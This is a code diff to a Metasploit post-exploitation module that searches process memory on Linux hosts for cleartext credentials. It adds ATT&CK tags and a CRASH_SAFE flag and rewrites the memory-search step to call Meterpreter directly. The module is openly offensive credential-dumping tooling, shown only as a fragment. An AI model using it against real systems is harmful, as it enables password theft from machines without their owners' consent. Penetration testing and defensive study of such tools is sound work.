@@ -37,12 +37,14 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'https://github.com/huntergregal/mimipenguin' ],
           [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/gnome-keyring/+bug/1772919' ],
           [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/lightdm/+bug/1717490' ],
-          [ 'CVE', '2018-20781' ]
+          [ 'CVE', '2018-20781' ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1003_007_PROC_FILESYSTEM ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1003_008_ETC_PASSWD_AND_ETC_SHADOW ]
         ],
         'DisclosureDate' => '2018-05-23',
         'DefaultTarget' => 0,
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
           'SideEffects' => []
         },
@@ -125,8 +127,20 @@ class MetasploitModule < Msf::Post
     target_info['pids'] = target_pids
     target_info['pids'].each_with_index do |target_pid, _ind|
       vprint_status("Searching PID #{target_pid}...")
-      res = mem_search_ascii(5, 500, target_info['needles'], pid: target_pid)
-      target_info['matches'][target_pid] = res.empty? ? nil : res
+      response = session.sys.process.memory_search(pid: target_pid, needles: target_info['needles'], min_match_length: 5, max_match_length: 500)
+
+      matches = []
+      response.each(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_RESULTS) do |res|
+        match_data = {}
+        match_data['match_str'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_STR)
+        match_data['match_offset'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR)
+        match_data['sect_start'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_START_ADDR)
+        match_data['sect_len'] = res.get_tlv_value(::Rex::Post::Meterpreter::Extensions::Stdapi::TLV_TYPE_MEMORY_SEARCH_SECT_LEN)
+
+        matches << match_data
+      end
+
+      target_info['matches'][target_pid] = matches.empty? ? nil : matches
     end
   end
 
